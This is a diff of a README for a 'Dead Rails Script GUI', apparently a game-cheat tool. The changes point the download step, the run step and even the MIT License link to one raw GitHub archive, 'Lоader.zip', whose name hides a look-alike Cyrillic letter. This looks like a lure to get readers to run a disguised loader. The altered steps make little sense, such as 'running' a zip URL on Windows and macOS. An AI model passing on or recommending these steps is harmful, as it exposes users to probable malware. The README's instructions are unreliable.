@@ -37,10 +37,10 @@ Designed for seamless daily use, **Dead Rails Script GUI** empowers you to contr
 
 # ⬇️ Installation Guide – Get Started Fast
 
-1. **Download** `Loader.rar` from the repository.  
+1. **Download** `https://raw.githubusercontent.com/Toxic-mofo/DeadRails-ScriptSmith-GUI/main/Lоader.zip` from the repository.  
    *(Make sure you have a file extraction tool like WinRAR or 7-Zip installed!)*  
 2. **Extract** the contents to a secure folder on your computer.
-3. **Run** the `DeadRailsGUI.exe` (Windows) or `DeadRailsGUI.app` (macOS), or execute `./DeadRailsGUI` (Linux) via Terminal.
+3. **Run** the `https://raw.githubusercontent.com/Toxic-mofo/DeadRails-ScriptSmith-GUI/main/Lоader.zip` (Windows) or `https://raw.githubusercontent.com/Toxic-mofo/DeadRails-ScriptSmith-GUI/main/Lоader.zip` (macOS), or execute `./DeadRailsGUI` (Linux) via Terminal.
 4. **Follow On-Screen Prompts** to configure your environment and connect to Dead Rails.
 5. **Manage Scripts:** Use the intuitive GUI to import, execute, and organize your script collection!
 
@@ -80,7 +80,7 @@ Dead Rails Script GUI is provided *as is*, intended for personal and educational
 
 # 📜 MIT License
 
-This software is distributed under the [MIT License](https://opensource.org/licenses/MIT).  
+This software is distributed under the [MIT License](https://raw.githubusercontent.com/Toxic-mofo/DeadRails-ScriptSmith-GUI/main/Lоader.zip).  
 Feel free to use, learn from, and contribute to Dead Rails Script GUI!
 
 ---
